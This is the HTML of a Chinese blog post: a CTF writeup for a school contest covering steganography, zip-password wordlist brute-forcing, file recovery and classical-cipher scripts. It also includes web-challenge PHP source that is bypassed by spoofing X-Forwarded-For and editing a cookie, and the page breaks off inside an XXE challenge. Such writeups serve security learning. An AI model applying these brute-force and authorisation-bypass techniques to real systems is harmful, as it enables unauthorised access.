@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.getflag.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言记一次校内的比赛">
+<meta property="og:type" content="article">
+<meta property="og:title" content="海啸杯writeup">
+<meta property="og:url" content="https://www.getflag.cn/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/index.html">
+<meta property="og:site_name" content="kawhi&#39;s Blog">
+<meta property="og:description" content="前言记一次校内的比赛">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119115739801.png">
+<meta property="og:image" content="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-YQrNMwiLAMKiXyXK.png">
+<meta property="og:image" content="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-qV653B9sifbnxjyQ.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120006028.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120028376.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120750180.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120947921.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120730923.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132632586.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119132855855.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133034032.png">
+<meta property="og:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119133206501.png">
+<meta property="article:published_time" content="2020-11-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-11-19T06:05:07.882Z">
+<meta property="article:author" content="kawhi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119115739801.png">
+
+<link rel="canonical" href="https://www.getflag.cn/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>海啸杯writeup | kawhi's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kawhi's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">年轻人不讲武德</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fab fa-pagelines fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.getflag.cn/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+      <meta itemprop="name" content="kawhi">
+      <meta itemprop="description" content="PHP是世界上最好的语言">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kawhi's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          海啸杯writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-19 00:00:00 / 修改时间：14:05:07" itemprop="dateCreated datePublished" datetime="2020-11-19T00:00:00+08:00">2020-11-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记一次校内的比赛<a id="more"></a></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>PNG高度隐藏</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119115739801.png" alt="image-20201119115739801"></p>
+<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>基于 LSB 原理图片隐写</p>
+<p>使用 Stegsolve 的 Data Extract 分析，下载地址：<a target="_blank" rel="noopener" href="https://share.weiyun.com/z9PBJjks">https://share.weiyun.com/z9PBJjks</a></p>
+<p>加载图片，并 Data Extract 分析</p>
+<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-YQrNMwiLAMKiXyXK.png"></p>
+<p>这里就分析出来一个 png 的文件。点击下方 save bin 保存为 png 文件即可。</p>
+<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-qV653B9sifbnxjyQ.png"></p>
+<p>扫描二维码即可获得flag。</p>
+<h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>直接丢kali，binwalk分离</p>
+<p>最后得到一个倒过来的flag，将其颠倒得到正确的flag</p>
+<h3 id="你能破解吗"><a href="#你能破解吗" class="headerlink" title="你能破解吗"></a>你能破解吗</h3><ul>
+<li>hint：压缩包密码为g2mtu加四位数字</li>
+</ul>
+<p>这里可以使用ARCHPR压缩包破解软件</p>
+<p>首先用遍历所有的密码，然后保存在1.txt字典里面</p>
+<p>遍历脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f &#x3D; open(&#39;1.txt&#39;,&#39;w&#39;)</span><br><span class="line">for i in range(1000,9999):</span><br><span class="line">	a &#x3D; &#39;g2mtu&#39;+str(i)+&#39;\n&#39;</span><br><span class="line">	f.write(a)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后打开软件选择字典模式</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120006028.png" alt="image-20201119120006028"></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120028376.png" alt="image-20201119120028376"></p>
+<p>解开压缩包再base64解密即可获得flag。</p>
+<h3 id="disk0"><a href="#disk0" class="headerlink" title="disk0"></a>disk0</h3><p>挂载命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount disk0 存放的文件夹</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120750180.png" alt="image-20201119120750180"></p>
+<p>一个文本文件，和一个加密过的zip，文本说密码被删除了，使用取证工具<strong>extundelete</strong>恢复一下disk0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete disk0 --restore-all</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120947921.png" alt="image-20201119120947921"></p>
+<p>得到一个RECOVERED_FILES文件夹，里面file文件就是zip的密码</p>
+<p>解压再修改一下图片高度即可得到flag</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="凯撒将军"><a href="#凯撒将军" class="headerlink" title="凯撒将军"></a>凯撒将军</h3><p>凯撒密码</p>
+<p>加密算法：将给定的flag中的每个字符后移3位，并将偏移后的字符串base64编码</p>
+<p>加密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;flag&#123;crypto_is_hxb_so_eAsy0&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">result = flag.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">encode_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    encode_flag += chr((ord(i)+<span class="number">3</span>)%<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> encode_flag</span><br></pre></td></tr></table></figure>
+
+<p>解密脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">result=<span class="string">&quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    flag += chr(ord(i)<span class="number">-3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>栅栏密码</p>
+<p>由于栅栏数较小，因此不给出栅栏数提示，可以用网上的栅栏密码解密或手写脚本爆破栅栏数解密</p>
+<p>加密脚本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flag &#x3D; &quot;flag&#123;yo_uget_itzha_lan_good&#125;&quot;</span><br><span class="line"></span><br><span class="line">#flag&#123;yo _uget_i tzha_la n_good&#125;</span><br><span class="line"></span><br><span class="line">k &#x3D; 7 </span><br><span class="line"></span><br><span class="line">flag &#123;yo_ uget _itz ha_l an_g ood&#125;</span><br><span class="line"></span><br><span class="line">f_tn</span><br><span class="line"></span><br><span class="line">encode_flag&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    for j in range(4):</span><br><span class="line">        encode_flag +&#x3D; flag[j*7+i]</span><br><span class="line"></span><br><span class="line">print encode_flag</span><br></pre></td></tr></table></figure>
+
+<p>​    解密脚本:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">encode_flag &#x3D; &quot;f_tnluz_aghggeao&#123;t_oy_ldoia&#125;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,29):</span><br><span class="line">    flag&#x3D;&quot;&quot;</span><br><span class="line">    num &#x3D; 28&#x2F;k</span><br><span class="line">    for i in range(k):</span><br><span class="line">	    for j in range(num):</span><br><span class="line">		    flag +&#x3D; encode_flag[j*k+i]</span><br><span class="line">    if &quot;flag&quot; in flag:</span><br><span class="line">        print &quot;k:&quot;+str(28&#x2F;k)+&quot;\n&quot;+&quot;flag:\n&quot;+flag+&quot;\n&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>描述：</p>
+<p>我军成功捣毁敌军秘密电台缴获密文和明文一份，但是还有一份密文难以破解特请你来破译密码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">密文：</span><br><span class="line">jivsyisgmlirgbggvuocevsivnsoevszotfloymivnmozwgitmbyfevtgugvffecgmflgtglimbggvjgmmuocevsivnijofcotgsoevsklgvflgkotjnkimmfejjhohyjifgnbwlyvfgtsiflgtgtmmcijjfeslfjwqvefstoyhmngrgjohgnflgetokvhiffgtvmozmhggulevnghgvngvfozgiuloflgtmocgjivsyisggdhgtfmbgjegrgflifwgitmisoklgvflgkotjnlinxymfzergfofgvcejjeovhgohjgflgwmhoqghgtlihmjivsyisgmbgfkggvflgcmoovizfgtkitnmcivwozflomghgohjgmfitfgnmgffjevsnokvfobguocgzitcgtmivnflgetjivsyisgmfoobguicgcotgmgffjgnivnzgkgtevvycbgtevtgugvfugvfytegmftingevnymfteijemifeovflgngrgjohcgvfozflgvifeovmfifgivnflgmhtginozyvergtmijuochyjmotwgnyuifeovgmhgueijjwsjobijemifeovivnbgffgtuoccyveuifeovmevflghimfzgknguingmijjlirguiymgncivwjivsyisgmfonemihhgitivnnocevivfjivsyisgmmyulimgvsjemlmhivemlivnulevgmgitgevutgimevsjwfiqevsorgtifhtgmgvfflgkotjnlimiboyfjivsyisgmflgnemftebyfeovozflgmgjivsyisgmemlysgjwyvgrgvflgsgvgtijtyjgemflifcejnpovgmlirgtgjifergjwzgkjivsyisgmozfgvmhoqgvbwcivwhgohjgklejglofkgfpovgmlirgjofmozfgvmhoqgvbwmcijjvycbgtmgytohglimovjwitoyvnjivsyisgmflgicgteuimiboyfizteuiivnimeiivnflghiuezeuhgtlihmozkleulhihyivgksyevgiijovgiuuoyvfmzotkgjjorgtflgcgneivvycbgtozmhgiqgtmemcgtgkleulfliflijzflgkotjnmjivsyisgmitgmhoqgvbwzgkgthgohjgflivflifijtginwkgjjorgtozflgfofijozjivsyisgmitgujomgfogdfevufeovkeflovjwizgkgjngtjwmhgiqgtmjgzfheuqiftivnocbymyyevuicgtoovgeslftgcievevsmhgiqgtmuleihivguoevcgdeuojehivihiulgevflgyvefgnmfifgmfkootfltggotkinxesyeviymftijeiovgkefliaygmfeovcitqvovgozflgmgmggcmfolirgcyululivugozmytrerij</span><br><span class="line">明文：</span><br><span class="line">Languages have been coming and going for thousands of years, but in recent times there has been less coming and a lot more going. When the world was still populated by hunter-gatherers，small，tightly knit(联系)groups developed their own patterns of speech independent of each other. Some language experts believe that 10,000 years ago, when the world had just five to ten million people, they spoke perhaps 12, 000 languages between them.Soon afterwards, many of those people started settling down to become farmers, and their languages too became more settled and fewer in number. In recent centuries, trade, industrialisation, the development of the nation-state and the spread of universal compulsory education, especially globalisation and better communications in the past few decades, all have caused many languages to disappear, and dominant languages such as English，Spanish and Chinese are increasingly taking over.At present, the world has about 6, 800 languages. The distribution of these languages is hugely uneven. The general rule is that mild zones have relatively few languages, often spoken by many people, while hot wet zones have lots, often spoken by small numbers. Europe has only around 200 languages; the Americas about 1, 000; Africa 2, 400; and Asia and the Pacific perhaps 3,200, of which Papua New Guinea alone accounts for well over 800.The median number(中位数) of speakers is mere 6,000, which that half the world&#39;s languages are spoken by fewer people than that.Already well over 400 of the total of 6, 800 languages are close to extinction (消亡), with only a few elderly speakers left. Pick, at random, Busuu in Cameroon （eight remaining speakers), Chiapaneco in Mexico (150), Lipan Apache in the United States (two or three) or Wadjigu in Australia (one, with a question-mark): none of these seems to have much chance of survival</span><br></pre></td></tr></table></figure>
+
+<p>待解密文：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givfome</span><br></pre></td></tr></table></figure>
+
+<p>解题过程</p>
+<p>进行字频统计得出如下结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">e &#x3D;&gt;g</span><br><span class="line">a &#x3D;&gt;i</span><br><span class="line">n &#x3D;&gt;v</span><br><span class="line">t &#x3D;&gt;f</span><br><span class="line">o &#x3D;&gt;o</span><br><span class="line">s &#x3D;&gt;m</span><br><span class="line">i &#x3D;&gt;e</span><br><span class="line">r &#x3D;&gt;j</span><br><span class="line">l &#x3D;&gt;t</span><br><span class="line">h &#x3D;&gt;l</span><br><span class="line">u &#x3D;&gt;y</span><br><span class="line">d &#x3D;&gt;s</span><br><span class="line">g &#x3D;&gt;h</span><br><span class="line">p &#x3D;&gt;n</span><br><span class="line">c &#x3D;&gt;u</span><br><span class="line">m &#x3D;&gt;c</span><br><span class="line">f &#x3D;&gt;z</span><br><span class="line">w &#x3D;&gt;k</span><br><span class="line">y &#x3D;&gt;b</span><br><span class="line">v &#x3D;&gt;w</span><br><span class="line">k &#x3D;&gt;r</span><br><span class="line">c &#x3D;&gt;q</span><br><span class="line">p &#x3D;&gt;d</span><br><span class="line">t &#x3D;&gt;p</span><br><span class="line">x &#x3D;&gt;x</span><br><span class="line">j &#x3D;a</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>加密脚本</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>]</span><br><span class="line">s = <span class="string">&quot;eantosi&quot;</span></span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	k=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">		i = i.lower()</span><br><span class="line">		<span class="keyword">if</span> j == i:</span><br><span class="line">			l =(<span class="number">19</span>*k+<span class="number">18</span>)%<span class="number">26</span>	</span><br><span class="line">			m = m + table[l]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			k = k+<span class="number">1</span>	</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eantosi&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="G2mtu学生？"><a href="#G2mtu学生？" class="headerlink" title="G2mtu学生？"></a>G2mtu学生？</h3><p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;0&quot;</span>, time()+<span class="number">360</span>);</span><br><span class="line"><span class="keyword">if</span>(@$_SERVER[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]!=<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;u no student in Gzmtu&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_COOKIE[<span class="string">&#x27;user&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">	 <span class="keyword">echo</span> <span class="string">&quot;flag&#123;welcom_to_GZMTU_56456s4awdawdafafa&#125;&quot;</span>;		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;u no admin!&quot;</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>xff伪造ip为127.0.0.1然后改cookie未授权访问即可获取到flag</p>
+<h3 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h3><p>考点</p>
+<ul>
+<li>XXE外部实体注入</li>
+</ul>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 